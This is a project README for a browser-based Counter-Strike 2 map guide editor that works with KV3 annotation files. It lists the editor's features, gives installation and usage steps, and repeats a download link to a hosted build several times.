# CS|Studio Map Guide Tool v2026 - browser-based map guide editor 2026

> **A browser-based CS2 map guide editor for KV3 annotation files, built for workshop creators who want to plan, preview, and export grenade lineups through a client-side workflow in v2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/colebrandon36/csstudio-map-guide-hub?style=flat-square)](https://github.com/colebrandon36/csstudio-map-guide-hub)

---

<p align="center">
  <a href="https://colebrandon36.github.io/csstudio-map-guide-hub/">
    <img src="https://img.shields.io/badge/Download-CS%7CStudio%20Map%20Guide%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download CS|Studio Map Guide Tool">
  </a>
</p>

> **[Download Latest Build - CS|Studio Map Guide Tool v2026](https://colebrandon36.github.io/csstudio-map-guide-hub/)**

---

[Download Latest Build](https://colebrandon36.github.io/csstudio-map-guide-hub/)

---

## Overview

CS|Studio Map Guide Tool is a browser-first editor for Counter-Strike 2 map guides that uses KV3 annotation files as its core format. It provides a fully client-side workspace where creators can shape grenade lineups, manage map nodes, and assemble workshop-ready guide content without relying on a server or installing a separate app.

It is designed for authors who want to convert raw notes, demos, or reference clips into organized in-game guides. With its interactive radar view, editing controls, and export path, the tool helps produce clean map documentation while keeping the entire process inside the browser.

---

## Features

- KV3 parser and serializer for working with annotation files
- Auto-formatting pipeline to keep guide data structured
- Interactive map view with pan and zoom controls
- Dual CT and T guide editing for side-specific setup
- Node editor for arranging map guide points
- Drag-and-drop reordering for faster content organization
- Undo and redo support for safer editing sessions
- LocalStorage autosave to preserve progress in the browser
- Theme customization for adjusting the editor look and feel
- Teleport command copy for quick in-game reference use
- Built-in map support for common guide workflows
- Dev console for inspecting and testing editor behavior

---

## Installation

This project is intended to run directly in the browser.

1. Download or clone the repository:
   - `git clone https://github.com/colebrandon36/csstudio-map-guide-hub.git
2. Open the web app from the project files or deploy it to a static host.
3. Start using the editor in your browser and begin creating or loading guide data.

If you are using a hosted build, open the published link and the editor should load directly.

---

## Usage

1. Load a map or start a new guide session.
2. Add nodes, paths, and annotations for your lineup route.
3. Switch between CT and T views when working on side-specific instructions.
4. Use pan and zoom to position radar details precisely.
5. Reorder steps with drag and drop, then refine the layout with undo and redo as needed.
6. Copy teleport commands when you need quick movement references.
7. Export the finished guide data in the expected file format.

Typical workflow:

- Import or create KV3-based guide content
- Edit the map and annotation structure
- Review formatting and node order
- Save locally in the browser
- Export when the guide is ready for use

---

## Configuration

Most preferences are managed in the browser and retained through localStorage autosave.

Example preferences may include:

- Theme selection
- Editor layout behavior
- Map view state
- Recent work session data

If you need to reset the workspace, clear the site storage in your browser and reload the app.

---

## Requirements

- A modern web browser
- JavaScript enabled
- Enough local storage for autosaved guide data
- A compatible environment for opening static web files or the hosted build

No separate server setup is required for standard browser use.

---

## FAQ

**How do I get updates?**  
Use the hosted build or pull the latest repository changes when a new revision is published.

**Where are my edits stored?**  
Session data is saved in browser storage through localStorage autosave unless you export it manually.

**Can I adjust the editor appearance?**  
Yes. Theme customization is available for changing the interface style.

**What if a guide does not load correctly?**  
Check that the KV3 annotation file is valid and that the browser has not blocked local storage or file access.

**Is there a debug mode?**  
A dev console is included for testing and inspection during development workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
